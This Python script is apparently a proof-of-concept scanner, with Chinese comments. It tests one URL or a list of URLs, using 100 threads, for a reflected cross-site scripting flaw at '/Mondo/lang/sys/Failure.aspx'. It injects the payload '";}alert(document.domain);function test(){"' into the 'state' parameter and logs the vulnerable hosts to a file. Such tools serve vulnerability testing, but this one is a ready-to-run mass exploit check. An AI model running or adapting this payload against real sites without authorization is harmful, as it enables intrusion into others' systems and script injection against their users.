import argparse,requests,sys,random
from multiprocessing.dummy import Pool

# /Mondo/lang/sys/Failure.aspx?state=19753%22;}alert(document.domain);function%20test(){%22

def poc(target):
    try:
        
        payload = """/Mondo/lang/sys/Failure.aspx?state=19753%22;}alert(document.domain);function%20test(){%22"""

        # 发送请求检测存活
        res1 = requests.get(url=target,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload,timeout=5)
            
            # 检测是否会返回(document.domain)字段
            if '(document.domain)' in res2.text :
                print(f"[+] 目标 {target} 存在反射型xss漏洞")
                with open ('result3.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-] 目标 {target} 不存在反射型xss漏洞")
        else:
            print(f"[*] 目标 {target} 访问异常")
    except:
        pass

def main():
    # 定义命令行参数
    parse = argparse.ArgumentParser(description="检测反射型xss漏洞")
    
    # 添加参数
    parse.add_argument('-u', '--url', dest='url', type=str, help="单个目标URL，例如: http://example.com")
    parse.add_argument('-f', '--file', dest='file', type=str, help="包含多个目标URL的文件路径，每行一个URL")
    
    # 解析参数
    args = parse.parse_args()
    if args.url and not args.file:
            poc(args.url)
    elif args.file and not args.url:
            url_list = []
            with open (args.file,'r',encoding='utf-8') as f:
                for i in f.readlines():
                    url_list.append(i.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
            print(f'usage: Python {sys.argv[0]} -h')

if __name__ == '__main__':
    main()